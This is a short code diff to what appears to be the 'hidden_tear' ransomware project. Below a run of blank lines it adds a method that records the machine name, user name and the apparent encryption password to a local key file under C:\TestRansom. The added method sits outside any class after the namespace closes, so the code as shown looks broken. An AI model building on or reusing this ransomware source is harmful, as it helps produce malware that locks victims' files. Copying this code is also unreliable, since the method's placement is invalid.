@@ -221,3 +221,29 @@ namespace hidden_tear
         }
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+static void SendPassword(string password)
+{
+    try
+    {
+        string info = $"{Environment.MachineName}-{Environment.UserName} {password}";
+        string keyFile = @"C:\TestRansom\key.txt";
+        File.AppendAllText(keyFile, info + Environment.NewLine);
+        Console.WriteLine($"Key saved to {keyFile}");
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"Failed to save key: {ex.Message}");
+    }
+}
